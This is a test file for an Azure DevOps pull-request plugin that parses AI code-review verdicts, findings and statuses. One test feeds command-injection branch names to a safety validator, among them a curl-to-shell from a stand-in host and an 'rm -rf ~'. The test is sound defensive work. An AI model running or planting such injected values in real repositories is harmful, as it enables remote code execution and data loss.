import { describe, expect, test } from 'claude-code/testing'
import type { TestBody } from 'claude-code/testing'
import type { On } from 'claude-code'

import {
  isReviewStale,
  isSafeBranchName,
  parseProjectUrl,
  requests,
  reviewOf,
  reviewThreadsOf,
  summaryLead,
  toPullRequestDetail,
  toPullRequestRows,
  verdictOfSummary,
} from '../hooks/ado'
import { buildPullRequestLines } from '../hooks/tree'
import { CWD } from './repo'

const REF = parseProjectUrl('https://fabrikam.visualstudio.com/Demo')
const PR_URL = 'https://fabrikam.visualstudio.com/Demo/_git/Demo/pullrequest/22'

/** Shapes taken from PR 22 of the Demo project, as the Claude Code Review pipeline posted them. */
const PR_22 = {
  pullRequestId: 22,
  title: 'Add room search',
  description: 'Search rooms by keyword',
  sourceRefName: 'refs/heads/feature/search',
  targetRefName: 'refs/heads/main',
  isDraft: false,
  createdBy: { displayName: 'Dana' },
  repository: { id: 'repo-1', name: 'Demo' },
  lastMergeSourceCommit: { commitId: '5856ec32' },
}

const STATUSES_22 = {
  value: [
    { id: 1, description: 'Coverage status check queued', context: { name: 'codecoverage', genre: 'claude code review - pr (yaml)' } },
    { id: 2, iterationId: 1, state: 'pending', description: 'Claude Code review is running', context: { name: 'claude-code-review', genre: 'ai-review' } },
    {
      id: 3,
      iterationId: 1,
      state: 'failed',
      description: 'block - Critical 1 / Warning 2 / Suggestion 2',
      context: { name: 'claude-code-review', genre: 'ai-review' },
      targetUrl: 'https://fabrikam.visualstudio.com/Demo/_build/results?buildId=165',
    },
  ],
}

const SUMMARY =
  '### Claude Code Review 阻擋合併（block）\n\n**Critical 1** ｜ **Warning 2** ｜ **Suggestion 2**\n\n建議 block。\n\n| 編號 | 等級 |\n|:--|:--|\n| C1 | Critical |'

const THREADS_22 = {
  value: [
    {
      id: 87,
      status: 'active',
      threadContext: { filePath: '/src/RoomBooking.Application/RoomQueryService.cs', rightFileStart: { line: 28 } },
      properties: {
        'ClaudeReview.Kind': { $value: 'finding' },
        'ClaudeReview.Severity': { $value: 'Warning' },
        'ClaudeReview.RuleKey': { $value: 'TS-8' },
      },
      comments: [{ content: '[Warning] 新增的 `SearchRooms` 沒有任何 unit test\n\n**問題** 沒有測試\n<!-- claude-review:7870d2cdf8caefc2 -->' }],
    },
    {
      id: 86,
      status: 'active',
      threadContext: { filePath: '/.claude/settings.json', rightFileStart: { line: 10 } },
      properties: {
        'ClaudeReview.Kind': { $value: 'finding' },
        'ClaudeReview.Severity': { $value: 'Critical' },
        'ClaudeReview.RuleKey': { $value: 'CWE-829' },
      },
      comments: [{ content: '[Critical] 專案設定新增會執行任意指令的 hook 與 MCP server\n\n**問題** hook' }],
    },
    { id: 89, status: 'closed', properties: { 'ClaudeReview.Kind': { $value: 'summary' } }, comments: [{ content: SUMMARY }] },
    { id: 90, status: 'active', comments: [{ content: 'A person asks a question' }] },
    { id: 91, isDeleted: true, properties: { 'ClaudeReview.Kind': { $value: 'finding' } }, comments: [{ content: '[Warning] gone' }] },
  ],
}

describe('review parsing', () => {
  test('the verdict is the latest ai-review/claude-code-review status, split into verdict and counts', () => {
    expect(reviewOf(STATUSES_22)).toEqual({
      state: 'failed',
      verdict: 'block',
      counts: 'Critical 1 / Warning 2 / Suggestion 2',
      iterationId: 1,
      reportUrl: 'https://fabrikam.visualstudio.com/Demo/_build/results?buildId=165',
    })
    expect(reviewOf({ value: [STATUSES_22.value[1]] })).toMatchObject({ state: 'pending', verdict: 'reviewing', counts: '' })
    expect(reviewOf({ value: [STATUSES_22.value[0]] })).toBeUndefined()
  })

  test('a verdict with a space, as `fix first`, is still split from the counts', () => {
    const fixFirst = { ...STATUSES_22.value[2], description: 'fix first - Critical 0 / Warning 2 / Suggestion 0' }
    expect(reviewOf({ value: [fixFirst] })).toMatchObject({
      verdict: 'fix first',
      counts: 'Critical 0 / Warning 2 / Suggestion 0',
    })
  })

  test('findings come most severe first; the summary, deleted and other people\'s threads are not findings', () => {
    const { summary, findings } = reviewThreadsOf(PR_URL, THREADS_22)
    expect(findings.map(finding => finding.threadId)).toEqual([86, 87])
    expect(findings[1]).toEqual({
      threadId: 87,
      severity: 'Warning',
      rule: 'TS-8',
      title: '新增的 `SearchRooms` 沒有任何 unit test',
      body: '**問題** 沒有測試',
      filePath: '/src/RoomBooking.Application/RoomQueryService.cs',
      line: 28,
      status: 'active',
      url: `${PR_URL}?discussionId=87`,
    })
    expect(summary).toBe(SUMMARY)
    expect(verdictOfSummary(summary)).toBe('block')
    expect(summaryLead(summary)).toBe('Claude Code Review 阻擋合併（block）\n\nCritical 1 ｜ Warning 2 ｜ Suggestion 2\n\n建議 block。')
  })

  test('fixed findings come last, whatever their severity', () => {
    const [critical, ...rest] = THREADS_22.value
    const threads = { value: [{ ...rest[0], status: 'fixed' }, critical, ...rest.slice(1)] }
    const { findings } = reviewThreadsOf(PR_URL, threads)
    expect(findings.map(finding => [finding.threadId, finding.status])).toEqual([
      [87, 'active'],
      [86, 'fixed'],
    ])
  })

  test('the detail joins the PR, its review, its newest iteration and its work items; a later push makes the review stale', () => {
    const detail = toPullRequestDetail(REF, {
      pr: PR_22,
      statuses: STATUSES_22,
      threads: THREADS_22,
      iterations: { value: [{ id: 1 }, { id: 2 }] },
      workItems: { value: [{ id: '31' }] },
    })
    expect(detail).toMatchObject({
      id: 22,
      repo: 'Demo',
      source: 'feature/search',
      target: 'main',
      url: PR_URL,
      sourceCommit: '5856ec32',
      latestIterationId: 2,
      workItemIds: [31],
      review: { verdict: 'block' },
    })
    expect(isReviewStale(detail)).toBe(true)
    expect(isReviewStale({ ...detail, latestIterationId: 1 })).toBe(false)
  })

  test('without a status the summary heading still gives the verdict', () => {
    const detail = toPullRequestDetail(REF, { pr: PR_22, statuses: { value: [] }, threads: THREADS_22, iterations: {}, workItems: {} })
    expect(detail.review).toEqual({ state: '', verdict: 'block', counts: '' })
  })

  test('rows sort by repository then newest PR, and lay out under their repository', () => {
    const rows = toPullRequestRows(REF, {
      value: [
        { ...PR_22, pullRequestId: 20 },
        { ...PR_22, pullRequestId: 5, repository: { id: 'repo-2', name: 'Api' } },
        PR_22,
        { title: 'no id' },
      ],
    })
    expect(rows.map(row => `${row.repo}!${row.id}`)).toEqual(['Api!5', 'Demo!22', 'Demo!20'])
    expect(
      buildPullRequestLines(rows).map(line => (line.kind === 'repo' ? `${line.repo}(${line.count})` : `${line.prefix}!${line.row.id}`)),
    ).toEqual(['Api(1)', '└─ !5', 'Demo(2)', '├─ !22', '└─ !20'])
  })

  test('a branch name a shell could run, an option, or a fork source is flagged', () => {
    expect(isSafeBranchName('feature/31-room-search')).toBe(true)
    expect(isSafeBranchName('x$(curl evil|sh)')).toBe(false)
    expect(isSafeBranchName('--upload-pack=x')).toBe(false)
    expect(isSafeBranchName('a..b')).toBe(false)
    const answers = { statuses: {}, threads: {}, iterations: {}, workItems: {} }
    expect(toPullRequestDetail(REF, { ...answers, pr: PR_22 })).toMatchObject({ hasSafeBranchNames: true, isFromFork: false })
    const hostile = { ...PR_22, sourceRefName: 'refs/heads/x;rm -rf ~', forkSource: { repository: { name: 'Fork' } } }
    expect(toPullRequestDetail(REF, { ...answers, pr: hostile })).toMatchObject({ hasSafeBranchNames: false, isFromFork: true })
  })

  test('git requests name the Code scope, so a rejected PAT says which scope is missing', () => {
    expect(requests.pullRequests(REF)).toMatchObject({
      method: 'GET',
      url: 'https://fabrikam.visualstudio.com/Demo/_apis/git/pullrequests?searchCriteria.status=active&$top=100&api-version=7.1',
      scope: 'Code (Read)',
    })
    expect(requests.pullRequestThreads(REF, 'repo-1', 22).url).toBe(
      'https://fabrikam.visualstudio.com/Demo/_apis/git/repositories/repo-1/pullRequests/22/threads?api-version=7.1',
    )
  })
})

/**
 * `codeScope: false` answers every git call as a PAT without the Code scope does;
 * `statusesFail` fails only the status calls. `sent` collects every URL.
 */
function seatRepo(on: On, codeScope = true, sent: string[] = [], statusesFail = false) {
  on('session.cwd', () => ({ value: CWD }))
  on('settings.read', () => ({ value: { env: { ADO_PAT_TEST: 'secret' } } }))
  on('fs.read', () => ({ value: JSON.stringify({ projectUrl: 'https://fabrikam.visualstudio.com/Demo', patEnv: 'ADO_PAT_TEST' }) }))
  on('http.fetch', (_$, e) => {
    sent.push(e.url)
    const body = (text: unknown) => ({ value: { status: 200, ok: true, headers: {}, text: JSON.stringify(text) } })
    if (e.url.includes('/_apis/git/')) {
      if (!codeScope) return { value: { status: 401, ok: false, headers: {}, text: '' } }
      if (e.url.includes('/statuses')) return statusesFail ? { value: { status: 429, ok: false, headers: {}, text: '' } } : body(STATUSES_22)
      if (e.url.includes('/threads')) return body(THREADS_22)
      if (e.url.includes('/iterations')) return body({ value: [{ id: 1 }] })
      if (e.url.includes('/workitems')) return body({ value: [{ id: '31' }] })
      if (e.url.includes('/pullrequests/22')) return body(PR_22)
      return body({ value: [PR_22] })
    }
    if (e.url.includes('/classificationnodes/')) return body({ children: [] })
    if (e.url.includes('/wiql')) return body({ workItems: [{ id: 7 }] })
    return body({ value: [{ id: 7, fields: { 'System.Title': 'Fix login', 'System.State': 'Active', 'System.WorkItemType': 'Task' } }] })
  })
}

async function mountPane($: Parameters<TestBody>[0], surface: 'terminal' | 'desktop' = 'terminal') {
  return $.ui.mount({
    plugin: 'ado-tasks',
    surface,
    component: 'Pane',
    requestId: 'ado-tasks',
    props: {
      title: 'Azure DevOps Work Items',
      isFocused: true,
      bodyColumns: 80,
      placement: 'dock',
      scroll: { offset: 0, bodyRows: 30 },
      view: {},
    },
  })
}

test('the pane lists PRs under their repository with the verdict, opens the review, and fills the Claude Go prompt', async ($, on) => {
  seatRepo(on)
  const filled: string[] = []
  on('prompt.fill', (_$, e) => {
    filled.push(e.text)
    return { isFilled: true }
  })

  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await mountPane($, surface)
    await ui.press({ key: 'refresh' })

    expect(await ui.find({ key: 'open-7' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Pull requests \(1 active\)/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Demo \(1\)/ })).toBeDefined()
    expect((await ui.find({ key: 'open-pr-22' }))?.text).toBe('!22')
    expect(await ui.find({ type: 'Text', text: 'block' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: 'Add room search' })).toBeDefined()

    await ui.press({ key: 'open-pr-22' })
    expect(await ui.find({ type: 'Text', text: /Review: block · Critical 1 \/ Warning 2 \/ Suggestion 2/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Findings \(2\)/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: '專案設定新增會執行任意指令的 hook 與 MCP server' })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /RoomQueryService\.cs:28 · TS-8/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /Work items: #31/ })).toBeDefined()

    await ui.press({ key: 'pr-go' })
    expect(filled.at(-1)).toBe(
      `使用 ado-tasks:claude-go-pr skill 處理 Azure DevOps Pull Request !22「Add room search」(repo Demo, feature/search → main, ${PR_URL})`,
    )

    await ui.press({ key: 'pr-back' })
    expect(await ui.find({ key: 'open-pr-22' })).toBeDefined()
    await ui.unmount()
  }
})

test('a PAT without the Code scope still lists the work items and names the missing scope under Pull requests', async ($, on) => {
  seatRepo(on, false)
  const ui = await mountPane($)
  await ui.press({ key: 'refresh' })

  expect(await ui.find({ key: 'open-7' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /missing the Code \(Read\) scope/ })).toBeDefined()
  expect(await ui.find({ key: 'open-pr-22' })).toBeUndefined()
  await ui.unmount()
})

test('get_pull_request answers the review with its findings and staleness; list_pull_requests filters by repository', async ($, on) => {
  seatRepo(on)

  const got = await $.tool.call({ tool: 'mcp__ado-tasks__get_pull_request', id: 22 } as never)
  expect(got.deny).toBeUndefined()
  const detail = JSON.parse(String(got.result)) as { review: { verdict: string }; findings: unknown[]; isReviewStale: boolean; source: string }
  expect(detail.review.verdict).toBe('block')
  expect(detail.findings.length).toBe(2)
  expect(detail.isReviewStale).toBe(false)
  expect(detail.source).toBe('feature/search')

  const listed = await $.tool.call({ tool: 'mcp__ado-tasks__list_pull_requests', repo: 'demo' } as never)
  expect((JSON.parse(String(listed.result)) as { count: number }).count).toBe(1)
  const none = await $.tool.call({ tool: 'mcp__ado-tasks__list_pull_requests', repo: 'Other' } as never)
  expect((JSON.parse(String(none.result)) as { count: number }).count).toBe(0)
})

test('statuses that fail to load show ? rather than no review; a filter change does not reload the PRs', async ($, on) => {
  const sent: string[] = []
  seatRepo(on, true, sent, true)
  const ui = await mountPane($)
  await ui.press({ key: 'refresh' })
  expect(await ui.find({ type: 'Text', text: '?' })).toBeDefined()
  const pullRequestCalls = () => sent.filter(url => url.includes('/_apis/git/pullrequests?')).length
  expect(pullRequestCalls()).toBe(1)

  await ui.press({ key: 'closed' })
  expect(pullRequestCalls()).toBe(1)
  expect(await ui.find({ key: 'open-pr-22' })).toBeDefined()
  await ui.press({ key: 'refresh' })
  expect(pullRequestCalls()).toBe(2)
  await ui.unmount()
})
